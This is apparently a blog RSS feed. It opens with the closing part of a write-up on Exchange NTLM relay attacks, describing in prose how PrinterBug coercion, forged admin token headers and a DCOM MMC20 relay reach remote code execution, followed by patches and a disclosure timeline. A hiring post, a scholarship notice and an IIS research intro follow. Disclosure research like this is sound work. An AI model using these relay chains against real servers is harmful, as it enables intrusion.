&lt;p&gt;Back to our attack, the core logic is as same as attacking EWS. Because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt; is also located at HTTP/HTTPS, it’s also relay-able. Once we bypass the authentication and access the route &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/RpcProxy.dll&lt;/code&gt;, we can impersonate as any user and operate his mailbox through the RPC-over-HTTP protocol. To implement the attack, we have ported lots of the &lt;a href=&quot;https://github.com/sensepost/ruler&quot;&gt;Ruler Project&lt;/a&gt; to &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt;. As the result of this showcase, we can bypass the authentication by PrinterBug and operates any user’s mailbox through Outlook Anywhere. The entire attack can be illustrated as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Establish &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCP_IN_DATA&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCP_OUT_DATA&lt;/code&gt;  channels to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for RPC I/O.&lt;/li&gt;
  &lt;li&gt;Trigger PrinterBug on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; and relay to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to complete NTLM handshakes.&lt;/li&gt;
  &lt;li&gt;Attach &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; headers to indicate we are Exchange Admin on both HTTP headers.&lt;/li&gt;
  &lt;li&gt;Interact with the Outlook Anywhere by lots of the coding works upon &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a&quot;&gt;MS-OXCRPC&lt;/a&gt; and &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef&quot;&gt;MS-OXCROPS&lt;/a&gt; over MS-RPCH…&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;2-3-attacking-backend-powershell&quot;&gt;2-3 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/PowerShell&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The last showcase we would like to highlight is relaying to Exchange PowerShell. Since we have bypassed the authentication on Backend IIS, it’s possible to perform a &lt;a href=&quot;https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html&quot;&gt;ProxyShell-Like&lt;/a&gt; exploit again! Once we can execute arbitrary Exchange Cmdlets, it shouldn’t be hard to find a Post-Auth RCE to chain together because we are Exchange Admin. There are hundreds of Cmdlets for the purpose of Exchange Management, and many past cases (&lt;a href=&quot;https://srcincite.io/advisories/src-2020-0019/&quot;&gt;CVE-2020-16875&lt;/a&gt;, &lt;a href=&quot;https://srcincite.io/advisories/src-2020-0025/&quot;&gt;CVE-2020-17083&lt;/a&gt;, &lt;a href=&quot;https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/&quot;&gt;CVE-2020-17132&lt;/a&gt;, &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&quot;&gt;CVE-2021-31207&lt;/a&gt; and more) have proven that this is not a difficult task, too.&lt;/p&gt;

&lt;p&gt;Since we decided not to participate in Pwn2Own, we did not implement this exploit chain. Here we leave this as an exercise for our readers. ;)&lt;/p&gt;

&lt;h3 id=&quot;2-4-patching-backend&quot;&gt;2-4 Patching BackEnd&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; and patch that in August 2022. This patch permanently eliminates all relay attacks on Backend by forcibly turning on the &lt;a href=&quot;https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/&quot;&gt;Extended Protection Authentication&lt;/a&gt; in IIS.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-3---relay-to-windows-dcom&quot;&gt;Round 3 - Relay to Windows DCOM&lt;/h2&gt;

&lt;p&gt;This part should be all credited to &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt;. The industry knows MS-DCOM is relay-able since &lt;a href=&quot;https://twitter.com/sploutchy&quot;&gt;Sylvain Heiniger&lt;/a&gt;’s awesome &lt;a href=&quot;https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/&quot;&gt;Relaying NTLM authentication over RPC&lt;/a&gt; research for long. However, Dlive creates an RCE-chain based on the group inheritance of Exchange Servers in Active Directory environments. Please shout out to him!&lt;/p&gt;

&lt;p&gt;The idea of this attack is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local Administrators&lt;/code&gt; group of Exchange Server includes the group member &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Trusted Subsystem&lt;/code&gt;, and all Exchange Server are in this group by default. That means the Machine Account &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01$&lt;/code&gt; is also the local administrator of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;. With this concept in mind, the impact of relay-to-MS-DCOM can be maximized and perfectly applied to Exchange Server now!&lt;/p&gt;

&lt;p&gt;Dlive has demonstrated this attack in his &lt;a href=&quot;https://www.youtube.com/watch?v=7h38rI8KT30&quot;&gt;DEFCON 29 talk&lt;/a&gt;. Although he didn’t publish the exploit code, the Wireshark screenshot in his &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf?page=45&quot;&gt;slides&lt;/a&gt;&lt;sup&gt;p45&lt;/sup&gt; has already hinted everything and is enough to reproduce. The process could be illustrated as the following:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate a connection, and relay the NTLM to the Endpoint Mapper (port 135) of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to get the Interface of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MMC20.Application&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; again, and relay the NTLM to the dynamic port allocated by the EPMapper, and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExecuteShellCommand(...)&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iMMC-&amp;gt;Document-&amp;gt;ActiveView&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Run arbitrary commands for fun and profit!&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Writing the whole exploit is fun, just like mixing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dcomexec.py&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; together. It’s recommended to write your own exploit code by hand for those who want to understand the DCOM mechanism more!&lt;/p&gt;

&lt;h3 id=&quot;patching-dcom&quot;&gt;Patching DCOM&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; and patch this DCOM-relay in June 2021. However, due to compatibility, &lt;strong&gt;the hardening on the server-side is disabled by default&lt;/strong&gt;. Server Admin has to manually activate the patch by creating the following registry key. If Server Admin didn’t read the documentation carefully, his Exchange Server is probably still vulnerable after the June patch.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\RequireIntegrityActivationAuthenticationLevel&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As for when will the protection be enforced on server side? According to the FAQ under the CVE page, Microsoft has addressed a three-phase rollout to fully mitigate this issue. Now, it’s on phase one, and the patch won’t be activated by default until June 14, 2022. So, at the time of this writing, this RCE is still exploitable on the latest version of Exchange Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Microsoft hash announce the second phase and enabled the hardening on the server-side by default on June 14, 2022. Exchange Server that installed the latest Windows patch should be safe now&lt;/em&gt;
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-4---relay-to-other-exchange-services&quot;&gt;Round 4 - Relay to Other Exchange Services…&lt;/h2&gt;

&lt;p&gt;Services that use NTLM as their authentication method on Exchange Server might be vulnerable, too. At the time of this writing, we have already found and reported one to MSRC. We believe there should be more, and this is a good target for those who want to discover vulnerabilities on Exchange Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;closing&quot;&gt;Closing&lt;/h1&gt;

&lt;p&gt;Here, this series has finally come to an end. Over the past two years, many ups and downs made this journey unusual. From the earliest bug collision with the bad actor, ITW panic, to the Pwn2Own hacking competition, and our talks got acceptance at top-level hacker conferences, we have a clear conscience that we didn’t do anything wrong. However, without understanding the context, there were lots of incorrect speculations and inaccurate media reports toward our company and me; there were even low blows to us… that sucks.&lt;/p&gt;

&lt;p&gt;Although there were also happy moments, such as winning our first Master-of-Pwn champion at the top-hacking competition Pwn2Own and got the Best Server-Side bug of Pwnie Awards, the gossip and troll really harassed and depressed me a lot…&lt;/p&gt;

&lt;p&gt;Congratulate that I can finally close this research and start my new hacking. I am nothing but a security nerd who would rather spend more time on hacks, and please don’t blame me if my sentences are sometimes short and unclear; it’s not easy to express things in an unfamiliar language. It took me about 4x~5x times to arrange a presentation or article in a non-native language; lots of words were lost during refining.&lt;/p&gt;

&lt;p&gt;Hope that one day, there will be no language barrier. In a bar, with beers, we can talk about hacks, the culture, and hacking all night!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Jun 02, 2021&lt;/strong&gt; - We reported the vulnerability to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - MSRC opened the case. (No. 65594)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - We attached a 90-days Vulnerability Disclosure Policy to MSRC. The deadline is &lt;strong&gt;Sep 01, 2021&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 11, 2021&lt;/strong&gt; - MSRC replied that they are aiming to complete it before September.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 22, 2021&lt;/strong&gt; - MSRC said the case doesn’t look like it will be fully resolved by September.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 25, 2021&lt;/strong&gt; - We said we could extend the deadline and let us know the new estimated date.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 25, 2021&lt;/strong&gt; - We asked for the estimated date again.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 01, 2021&lt;/strong&gt; - MSRC said this case has been expanding into a design change and the intended release date is &lt;strong&gt;December 2021&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 08, 2021&lt;/strong&gt; - We asked is it possible to shorten the time frame because we would like to disclose this at conferences.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sep 17, 2021&lt;/strong&gt; - MSRC replied there are not quick and simple fixes but design level changes, they can’t get the changes in October.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Oct 25, 2021&lt;/strong&gt; - We decided not to disclose this at conferences and gave the team a fair time for fixing and testing. We hoped this bug could be fixed as scheduled in December 2021.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dec 21, 2021&lt;/strong&gt; - We asked for updates on this case.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dec 22, 2021&lt;/strong&gt; - MSRC replied they aimed to include this patch in a CU (Cumulative Update) instead of an SU (Security Update) due to the level of changes. The next CU release date will be in &lt;strong&gt;March 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 04, 2022&lt;/strong&gt; - We asked that we don’t see the CU in March. When is the new release date?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 13, 2022&lt;/strong&gt; - MSRC replied the CU is delayed, and the current release date is on &lt;strong&gt;April 20, 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 20, 2022&lt;/strong&gt; - Microsoft released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 21, 2022&lt;/strong&gt; - We found our exploit still works fine on the latest version of Exchange Server and asked is this bug really fixed?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Apr 27, 2022&lt;/strong&gt; - MSRC replied the CU contain the code change, but it needs to be activated manually or with a script. There are still some testing concerns but the manual activation process will be public on &lt;strong&gt;May 10, 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;May 11, 2022&lt;/strong&gt; - MSRC said the documentation and the script are mapped for the Patching Tuesday of June 2022 (&lt;strong&gt;Jun 14, 2022&lt;/strong&gt;).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 10, 2022&lt;/strong&gt; - MSRC said there are still having some issues on testing and they are looking to release this in &lt;strong&gt;July 2022&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 04, 2022&lt;/strong&gt; - We asked if it will release in this month’s Patching Tuesday.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 10, 2022&lt;/strong&gt; - Don’t see anything, asked again.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 18, 2022&lt;/strong&gt; - Microsoft released the CVE and &lt;a href=&quot;https://techcommunity.microsoft.com/t5/exchange-team-blog/released-august-2022-exchange-server-security-updates/ba-p/3593862&quot;&gt;the patch activation documentation&lt;/a&gt;!&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/</link>
                <guid>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay</guid>
                <pubDate>Wed, 19 Oct 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 徵求資安研究員</title>
                <description>&lt;p&gt;你對資安研究有滿腔熱血但卻找不到人討論嗎？
常常參加各大 CTF 比賽，卻不知如何將學會的技能發揮在真實世界中嗎？
你也想要為保護世界盡一份心力嗎？&lt;/p&gt;

&lt;p&gt;DEVCORE Research Team 成立數年來持續研究最前瞻的資安技術，回報過多個世界級的漏洞，在 Black Hat、DEFCON 等國際資安研討會都能看見我們的戰績，Pwnie Awards、Best Web Hacking Techniques 各種獎項我們也毫不留情地橫掃，在 Pwn2Own 駭客大賽中更是列居首位！然而，資安領域之廣、更迭速度之快，單憑寥寥數人也是力有未逮，&lt;/p&gt;

&lt;p&gt;一個人走，可以走得很快；但一群人走，可以走得更遠。&lt;/p&gt;

&lt;p&gt;故此，We Need YOU!&lt;/p&gt;

&lt;p&gt;現在，DEVCORE Research Team 公開徵求資安研究員囉！不論你是專精於網頁安全，或是對逆向工程情有獨鍾，甚至你喜歡動手拆解硬體，我們不需要你的肝，只需要你對於資安研究的熱忱！我們看重的不是工作經驗，而是對資安傾注過多少心力！&lt;/p&gt;

&lt;p&gt;在這裡工作，你將可以得到&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;與頂尖駭客一起交流、合作的寶貴經驗&lt;/li&gt;
  &lt;li&gt;實際體驗並挖掘 Real World 漏洞，找到屬於自己的第一個 CVE！&lt;/li&gt;
  &lt;li&gt;深入業界實戰攻防，真實感受漏洞研究與企業資安的結合&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;想把駭客作為你的終身職嗎？歡迎各領域的駭客們一起加入！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;工作內容&quot;&gt;工作內容&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;個人研究 70%
    &lt;ul&gt;
      &lt;li&gt;對影響世界的產品進行漏洞研究&lt;/li&gt;
      &lt;li&gt;將找到的漏洞回報廠商並進行漏洞發表&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;檢測或協助專案 30%
    &lt;ul&gt;
      &lt;li&gt;規劃、執行產品安全測試&lt;/li&gt;
      &lt;li&gt;根據檢測需求，研究相關弱點或開發相關工具&lt;/li&gt;
      &lt;li&gt;協助紅隊執行專案，提供技術火力支援&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作條件要求&quot;&gt;工作條件要求&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;具備漏洞挖掘能力&lt;/li&gt;
  &lt;li&gt;具備漏洞利用程式撰寫能力&lt;/li&gt;
  &lt;li&gt;具備基本程式語言開發能力&lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;具備特定領域資安相關知識，包含但不限於
    &lt;ul&gt;
      &lt;li&gt;主流作業系統運作機制、相關漏洞及其利用技術&lt;/li&gt;
      &lt;li&gt;主流瀏覽器架構、相關漏洞及其利用技術&lt;/li&gt;
      &lt;li&gt;硬體介面相關攻擊手法、具實作經驗&lt;/li&gt;
      &lt;li&gt;手機底層韌體架構及防禦機制&lt;/li&gt;
      &lt;li&gt;網頁應用程式攻擊手法&lt;/li&gt;
      &lt;li&gt;網路相關攻擊手法&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加分條件&quot;&gt;加分條件&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
  &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
  &lt;li&gt;Flare-On 成績&lt;/li&gt;
  &lt;li&gt;公開的技術 blog/slide/write-ups 或 side projects&lt;/li&gt;
  &lt;li&gt;Bug Bounty / 漏洞回報經驗&lt;/li&gt;
  &lt;li&gt;資安研討會演講經驗&lt;/li&gt;
  &lt;li&gt;資安相關教學經驗&lt;/li&gt;
  &lt;li&gt;喜歡自己動手撰寫工具&lt;/li&gt;
  &lt;li&gt;主動追蹤並學習最新資安相關技術&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;起薪範圍&quot;&gt;起薪範圍&lt;/h3&gt;
&lt;p&gt;新台幣 80,000 - 100,000 （保證年薪 14 個月）&lt;/p&gt;

&lt;p&gt;詳細的工作環境與應徵方式請參考&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;招募頁面&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/09/21/202209-security-researcher-recruitment/</link>
                <guid>https://devco.re/blog/2022/09/21/202209-security-researcher-recruitment</guid>
                <pubDate>Wed, 21 Sep 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>戴夫寇爾持續投入資安人才培育 - 啟動全國資訊安全獎學金計劃、延續資安教育活動贊助計劃</title>
                <description>&lt;p&gt;戴夫寇爾自 2012 年成立以來，秉持著為台灣累積更豐厚的資安競爭力，不只透過主動式資安服務協助企業檢測資安防禦，進而提升整體資安體質；同時我們也很關注資安技術人才的培育，除了擔任學術、政府單位專任講師及顧問以外，也長期支持學生時期創辦的校園資安社團 NISRA（Network and Information Security Research Association），幫助學生們從學生時代建構正確的資訊安全意識及技能外，也更早瞭解資安產業的現況，與產業界接軌。&lt;/p&gt;

&lt;p&gt;近來產業紛紛加速數位轉型腳步，資安事件頻傳，加上相關法規的增設及施行，我們也觀察到資安重要性的關注度都大幅提高，為了培養更多人可以理解「駭客思維」、能模擬駭客攻擊情境、找出潛在資安風險，我們將擴大施行「資安人才培育計畫」，透過&lt;strong&gt;戴夫寇爾全國資訊安全獎學金&lt;/strong&gt;及&lt;strong&gt;贊助資安教育活動&lt;/strong&gt;等，支持更多志同道合的學子們關注資安議題，及早增強資安技能。&lt;/p&gt;

&lt;h3 id=&quot;支持下一代資安人才---戴夫寇爾啟動戴夫寇爾全國資訊安全獎學金計劃&quot;&gt;支持下一代資安人才 - 戴夫寇爾啟動「戴夫寇爾全國資訊安全獎學金」計劃&lt;/h3&gt;

&lt;p&gt;我們從學生時代就熱衷於資安研究，也透過校園課程、社團 NISRA 獲得充實的資安知識，有感於此，我們創立戴夫寇爾後也為母校—天主教輔仁大學、國立臺灣科技大學的學生設立了獎學金計畫，為學生的資安學習之路奉獻一點力量。&lt;/p&gt;

&lt;p&gt;此計畫在 2022年（111 學年度）已邁入第 4 年，我們也擴大補助的範疇，首度為全國大專院校學生推出「戴夫寇爾全國資訊安全獎學金」，只要在資訊安全領域有出眾研究成果的學生，皆可以申請「戴夫寇爾全國資訊安全獎學金」補助，幫助大家在求學期間更加專注學習、奠定資安專長，進而形成正向循環。&lt;/p&gt;

&lt;p&gt;有意申請者需提出學習資安的動機與歷程，並繳交資安研究或比賽成果，獲選者將能得到最高 2 萬元的研究補助，共 10 名。詳細申請辦法請見以下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;申請資格&lt;/strong&gt;：全國各大專院校學生皆可以申請。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;獎學金金額/名額&lt;/strong&gt;：每年度取 10 名，每名可獲得獎學金新台幣 20,000 元整，共計 20 萬元。如報名踴躍我們將視申請狀況增加名額。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;申請時程&lt;/strong&gt;：
    &lt;ul&gt;
      &lt;li&gt;2022/8/31 官網公告獎學金計畫資訊&lt;/li&gt;
      &lt;li&gt;2022/9/1 - 2022/9/30 開放收件&lt;/li&gt;
      &lt;li&gt;2022/10/31 公布審查結果，並將於 10 至 11 月間頒發獎學金&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;申請辦法&lt;/strong&gt;：
    &lt;ul&gt;
      &lt;li&gt;請依⽂件檢核表項次順序排列已附⽂件，彙整為⼀份 PDF 檔案，寄⾄ scholarship@devco.re。&lt;/li&gt;
      &lt;li&gt;信件主旨及 PDF 檔案名稱請符合以下格式：[全國獎學⾦申請] 學校名稱_學號_姓名（範例：[全國獎學⾦申請] 輔仁⼤學_B11100000_王⼩美）。&lt;/li&gt;
      &lt;li&gt;請申請⼈⾃我檢核並於申請⼈檢核區勾選已附⽂件，若⽂件不⿑或未確實勾選恕不受理申請。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;需檢附文件&lt;/strong&gt;：
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/戴夫寇爾全國獎學金申請表.pdf&quot;&gt;本獎學⾦申請表&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;在學證明&lt;/li&gt;
      &lt;li&gt;最近⼀學期成績單&lt;/li&gt;
      &lt;li&gt;學習資訊安全之動機與歷程⼼得⼀篇：字數 500 - 2000 字&lt;/li&gt;
      &lt;li&gt;資訊安全技術相關研究成果：至少須從以下六項目中擇一繳交，包含研討會投稿結果、漏洞獎勵計畫成果、弱點研究成果、資訊安全比賽成果、資安工具研究成果、技術文章發表成果等&lt;/li&gt;
      &lt;li&gt;社群經營成果：至少須從以下兩項目中擇一繳交，包含校園資安社團、公開資安社群等&lt;/li&gt;
      &lt;li&gt;推薦函：導師、系主任、其他教授或業界⼈⼠推薦函，⾄少須取得兩封以上推薦函&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;支持曾經的我們---戴夫寇爾續辦-2022-年資安教育活動贊助計劃&quot;&gt;支持曾經的我們 - 戴夫寇爾續辦 2022 年資安教育活動贊助計劃&lt;/h3&gt;

&lt;p&gt;身為資安人，我們在學生時期所累積對資安熱情和好奇心，支撐著我們一路走來，不忘初衷地協防台灣安全，同時也期望可以用一點力量為社會帶來貢獻，期盼在未來可以幫助更多社團或社群的力量成為培養專業的養分。&lt;/p&gt;

&lt;p&gt;因此，今年度我們也將持續贊助資安教育活動，提供經費予資安相關之社群、社團辦理各項活動，藉此降低資安知識落差，持續推廣資訊安全意識及技能，更進一步凝聚台灣資安社群的力量，幫助台灣培養下一個世代的資安人才。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;申請資格&lt;/strong&gt;：與資安議題相關之社群、社團活動，請由 1 位社團代表人填寫資料。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;贊助金額&lt;/strong&gt;：依各社團活動需求及與戴夫寇爾討論而定，每次最高補助金額為新台幣 20,000 元整。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;申請時程&lt;/strong&gt;：如欲申請此計畫的社團或活動，請於 2022/10/31 前透過以下連結填寫初步資料，我們會在 30 日內通知符合申請資格者提供進一步資料，不符合資格者將不另行通知。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;申請連結&lt;/strong&gt;：&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot;&gt;DEVCORE 2022 年資安教育活動贊助調查&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;需提供資料&lt;/strong&gt;：
    &lt;ul&gt;
      &lt;li&gt;申請資格：申請人需以各資安社群或社團名義提出申請。&lt;/li&gt;
      &lt;li&gt;聯絡電子郵件&lt;/li&gt;
      &lt;li&gt;想要辦理的活動類型&lt;/li&gt;
      &lt;li&gt;想要辦理的活動方式&lt;/li&gt;
      &lt;li&gt;活動總預算&lt;/li&gt;
      &lt;li&gt;預計需要贊助金額&lt;/li&gt;
      &lt;li&gt;代表人姓名、連絡電話&lt;/li&gt;
      &lt;li&gt;團體名稱&lt;/li&gt;
      &lt;li&gt;團體單位網址&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;注意事項&lt;/strong&gt;：
    &lt;ul&gt;
      &lt;li&gt;申請案審核將經過戴夫寇爾內部審核機制，並保有最終核決權。&lt;/li&gt;
      &lt;li&gt;本問卷僅供初步意願蒐集用途，符合申請資格者，戴夫寇爾將於 30 日內通知提供進一步資料供審核，其餘將不另行通知。&lt;/li&gt;
      &lt;li&gt;戴夫寇爾保有修改、暫停或終止本贊助計畫之權利。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2022/08/26/2022-devcore-national-cyber-security-scholarship/</link>
                <guid>https://devco.re/blog/2022/08/26/2022-devcore-national-cyber-security-scholarship</guid>
                <pubDate>Fri, 26 Aug 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Let's Dance in the Cache - Destabilizing Hash Table on Microsoft IIS</title>
                <description>&lt;p&gt;Hi, this is my fifth time speaking at &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://forum.defcon.org/node/241837&quot;&gt;DEFCON&lt;/a&gt;. You can get the slide copy and video there:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-22/Wednesday/US-22-Tsai-Lets-Dance-in-the-Cache-Destabilizing-Hash-Table-on-Microsoft-IIS.pdf&quot;&gt;Let’s Dance in the Cache - Destabilizing Hash Table on Microsoft IIS (slides)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#TBD&quot;&gt;Let’s Dance in the Cache - Destabilizing Hash Table on Microsoft IIS (video - TBD)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the most fundamental Data Structure in Computer Science, Hash Table is extensively used in Computer Infrastructures, such as Operating Systems, Programming Languages, Databases, and Web Servers. Also, because of its importance, Microsoft has designed its own Hash Table algorithm from a very early stage, and applied it heavily to its web server, IIS.&lt;/p&gt;

&lt;p&gt;Since IIS does not release its source code, I guess the algorithm implementation details should be an unexplored area to discover bugs. Therefore, &lt;strong&gt;this research mainly focuses on the Hash Table implementation and its usage&lt;/strong&gt;. We also look into the Cache mechanism because most of the Hash Table usages in IIS are Cache-Related!&lt;/p&gt;

